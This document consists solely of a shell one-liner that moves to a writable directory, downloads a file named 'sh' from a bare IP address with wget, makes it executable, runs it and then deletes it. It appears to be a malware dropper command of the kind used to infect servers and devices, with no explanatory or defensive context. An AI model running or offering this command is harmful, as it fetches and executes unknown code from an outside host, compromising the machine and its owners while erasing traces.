cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.62.188.231/sh; chmod +x sh; ./sh; rm -rf sh
